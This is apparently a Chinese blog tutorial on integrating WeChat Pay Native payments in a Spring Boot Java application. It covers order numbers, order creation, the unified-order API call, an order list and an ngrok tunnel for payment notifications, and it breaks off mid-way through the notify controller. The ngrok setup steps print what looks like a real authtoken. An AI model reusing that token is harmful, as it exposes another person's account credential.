class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 订单号工具类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> qy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderNoUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取订单编号</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getOrderNo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ORDER_&quot;</span> + getNo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取退款单编号</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getRefundNo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;REFUND_&quot;</span> + getNo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取编号</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyyMMddHHmmss&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">newDate</span> <span class="operator">=</span> sdf.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">            result += random.nextInt(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newDate + result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="业务流程时序图"><a href="#业务流程时序图" class="headerlink" title="业务流程时序图"></a>业务流程时序图</h2><p><a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_4.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_4.shtml</a></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220113234914.png"></p><h2 id="生成订单"><a href="#生成订单" class="headerlink" title="生成订单"></a>生成订单</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderInfoServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;OrderInfoMapper, OrderInfo&gt; <span class="keyword">implements</span> <span class="title class_">OrderInfoService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ProductMapper productMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> OrderInfo <span class="title function_">createOrderByProductId</span><span class="params">(Long productId)</span> &#123;</span><br><span class="line">        <span class="comment">//查询已存在的未支付订单</span></span><br><span class="line">        <span class="type">OrderInfo</span> <span class="variable">orderInfo</span> <span class="operator">=</span> <span class="built_in">this</span>.getNoPayOrderByProductId(productId);</span><br><span class="line">        <span class="keyword">if</span> (orderInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> orderInfo;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取商品信息</span></span><br><span class="line">        <span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> productMapper.selectById(productId);</span><br><span class="line">        <span class="comment">//生成订单</span></span><br><span class="line">        orderInfo = <span class="keyword">new</span> <span class="title class_">OrderInfo</span>();</span><br><span class="line">        orderInfo.setTitle(product.getTitle());</span><br><span class="line">        orderInfo.setOrderNo(OrderNoUtils.getOrderNo()); <span class="comment">//订单号</span></span><br><span class="line">        orderInfo.setProductId(productId);</span><br><span class="line">        orderInfo.setTotalFee(product.getPrice()); <span class="comment">//分</span></span><br><span class="line">        orderInfo.setOrderStatus(OrderStatus.NOTPAY.getType());</span><br><span class="line"></span><br><span class="line">        baseMapper.insert(orderInfo);</span><br><span class="line">        <span class="keyword">return</span> orderInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据商品id查询未支付订单，防止重复创建订单对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> productId</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfo <span class="title function_">getNoPayOrderByProductId</span><span class="params">(Long productId)</span> &#123;</span><br><span class="line">        QueryWrapper&lt;OrderInfo&gt; wrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;product_id&quot;</span>, productId);</span><br><span class="line">        wrapper.eq(<span class="string">&quot;order_status&quot;</span>, OrderStatus.NOTPAY.getType());</span><br><span class="line">        <span class="keyword">return</span> baseMapper.selectOne(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 存储订单二维码</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> orderNo</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codeUrl</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCodeUrl</span><span class="params">(String orderNo, String codeUrl)</span> &#123;</span><br><span class="line">        QueryWrapper&lt;OrderInfo&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;order_no&quot;</span>, orderNo);</span><br><span class="line">        <span class="type">OrderInfo</span> <span class="variable">orderInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderInfo</span>();</span><br><span class="line">        orderInfo.setCodeUrl(codeUrl);</span><br><span class="line">        baseMapper.update(orderInfo, queryWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Native下单API"><a href="#Native下单API" class="headerlink" title="Native下单API"></a>Native下单API</h2><blockquote><p>官方Api指引：<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_1.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_1.shtml</a></p></blockquote><p>定义Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;api/wx-pay&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;网站的微信支付API&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayService wxPayService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/native/&#123;productId&#125;&quot;)</span></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;调用统一下单API,生成支付二维码&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">nativePay</span><span class="params">(<span class="meta">@PathVariable</span> Long productId)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;发起支付请求&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回订单编号以及支付二维码</span></span><br><span class="line">        Map&lt;String, Object&gt; map = wxPayService.nativePay(productId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> R.ok().setData(map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义Service：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">WxPayService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayConfig wxPayConfig;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CloseableHttpClient wxPayClient;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建订单，调用Native支付接口</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> productId</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> code_url, orderNo</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">nativePay</span><span class="params">(Long productId)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        log.info(<span class="string">&quot;生成订单&quot;</span>); <span class="comment">//生成订单</span></span><br><span class="line"></span><br><span class="line">        <span class="type">OrderInfo</span> <span class="variable">orderInfo</span> <span class="operator">=</span> orderInfoService.createOrderByProductId(productId);</span><br><span class="line">        <span class="type">String</span> <span class="variable">codeUrl</span> <span class="operator">=</span> orderInfo.getCodeUrl();</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(codeUrl)) &#123;</span><br><span class="line">            log.info(<span class="string">&quot;订单已存在，二维码已保存&quot;</span>); <span class="comment">//返回二维码</span></span><br><span class="line">            Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;codeUrl&quot;</span>, codeUrl);</span><br><span class="line">            map.put(<span class="string">&quot;orderNo&quot;</span>, orderInfo.getOrderNo());</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        log.info(<span class="string">&quot;调用统一下单API&quot;</span>); <span class="comment">//调用统一下单API</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, Object&gt; paramsMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        paramsMap.put(<span class="string">&quot;appid&quot;</span>, wxPayConfig.getAppid());</span><br><span class="line">        paramsMap.put(<span class="string">&quot;mchid&quot;</span>, wxPayConfig.getMchId());</span><br><span class="line">        paramsMap.put(<span class="string">&quot;description&quot;</span>, orderInfo.getTitle());</span><br><span class="line">        paramsMap.put(<span class="string">&quot;out_trade_no&quot;</span>, orderInfo.getOrderNo());</span><br><span class="line">        paramsMap.put(<span class="string">&quot;notify_url&quot;</span>, wxPayConfig.getNotifyDomain().concat(WxNotifyType.NATIVE_NOTIFY.getType()));</span><br><span class="line">        Map&lt;String, Object&gt; amountMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        amountMap.put(<span class="string">&quot;total&quot;</span>, orderInfo.getTotalFee());</span><br><span class="line">        amountMap.put(<span class="string">&quot;currency&quot;</span>, <span class="string">&quot;CNY&quot;</span>);</span><br><span class="line">        paramsMap.put(<span class="string">&quot;amount&quot;</span>, amountMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将参数转换成json字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonParams</span> <span class="operator">=</span> gson.toJson(paramsMap);</span><br><span class="line">        log.info(<span class="string">&quot;请求参数：&quot;</span> + jsonParams);</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpPost</span> <span class="variable">httpPost</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpPost</span>(wxPayConfig.getDomain().concat(WxApiType.NATIVE_PAY.getType()));</span><br><span class="line">        <span class="type">StringEntity</span> <span class="variable">entity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringEntity</span>(jsonParams, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        entity.setContentType(<span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        httpPost.setEntity(entity);</span><br><span class="line">        httpPost.setHeader(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//完成签名并执行请求</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">CloseableHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> wxPayClient.execute(httpPost)) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">statusCode</span> <span class="operator">=</span> response.getStatusLine().getStatusCode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">bodyAsString</span> <span class="operator">=</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">            <span class="keyword">if</span> (statusCode == <span class="number">200</span>) &#123; <span class="comment">//处理成功</span></span><br><span class="line">                log.info(<span class="string">&quot;成功, 返回结果 = &quot;</span> + bodyAsString);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (statusCode == <span class="number">204</span>) &#123; <span class="comment">//处理成功，无返回Body</span></span><br><span class="line">                log.info(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;失败, 响应状态码 = &quot;</span> + statusCode + <span class="string">&quot;,返回结果 = &quot;</span> + bodyAsString);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;请求失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//响应结果</span></span><br><span class="line">            Map&lt;String, String&gt; resultMap = gson.fromJson(bodyAsString, HashMap.class);</span><br><span class="line">            <span class="comment">//二维码</span></span><br><span class="line">            codeUrl = resultMap.get(<span class="string">&quot;code_url&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//存储二维码</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">orderNo</span> <span class="operator">=</span> orderInfo.getOrderNo();</span><br><span class="line">            orderInfoService.saveCodeUrl(orderNo, codeUrl);</span><br><span class="line"></span><br><span class="line">            Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;codeUrl&quot;</span>, codeUrl);</span><br><span class="line">            map.put(<span class="string">&quot;orderNo&quot;</span>, orderInfo.getOrderNo());</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示订单列表"><a href="#显示订单列表" class="headerlink" title="显示订单列表"></a>显示订单列表</h2><p>定义Controller：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Api(tags = &quot;商品订单管理&quot;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/order-info&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderInfoController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrderInfoService orderInfoService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;订单列表&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">getOrderList</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;OrderInfo&gt; list = orderInfoService.listOrderByCreateTimeDesc();</span><br><span class="line">        <span class="keyword">return</span> R.ok().data(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义Service：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderInfoServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;OrderInfoMapper, OrderInfo&gt; <span class="keyword">implements</span> <span class="title class_">OrderInfoService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ProductMapper productMapper;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询订单列表，并倒序查询</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;OrderInfo&gt; <span class="title function_">listOrderByCreateTimeDesc</span><span class="params">()</span> &#123;</span><br><span class="line">        QueryWrapper&lt;OrderInfo&gt; wrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;OrderInfo&gt;().orderByDesc(<span class="string">&quot;create_time&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> baseMapper.selectList(wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="支付通知API"><a href="#支付通知API" class="headerlink" title="支付通知API"></a>支付通知API</h2><blockquote><p>官方Api指引：<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_5.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/apis/chapter3_4_5.shtml</a></p></blockquote><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><ol><li>访问ngrok的官网：<a href="https://ngrok.com/">https://ngrok.com/</a></li><li>注册账号并登录，也可以用Github账号登录</li><li>下载ngrok工具</li><li>设置 authToken，为本地计算机做授权配置，每个人令牌不同：<code>ngrok authtoken 6aYc6Kp7kpxVr8pY88LkG_6x9o18yMY8BASrXiDFMeS </code></li><li>启动服务：<code>ngrok http 8090 </code></li><li>测试外网访问：<code>你获得的外网地址/api/product/test </code></li></ol><h3 id="接收通知和返回应答"><a href="#接收通知和返回应答" class="headerlink" title="接收通知和返回应答"></a>接收通知和返回应答</h3><ol><li><p>启动<strong>ngrok</strong>服务：<code>ngrok http 8090 </code></p></li><li><p>在wxpay.properties设置通知地址（注意：每次重新启动ngrok，都需要根据实际情况修改这个配置）：<code>wxpay.notify-domain=https://7d92-115-171-63-135.ngrok.io </code></p></li><li><p>创建通知接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;api/wx-pay&quot;)</span></span><br><span class="line"><span class="meta">@Api(tags = &quot;网站的微信支付API&quot;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> WxPayService wxPayService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(&quot;支付通知&quot;)</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/native/notify&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">nativeNotify</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">Gson</span> <span class="variable">gson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>();</span><br><span class="line">        Map&lt;String, String&gt; map = <span 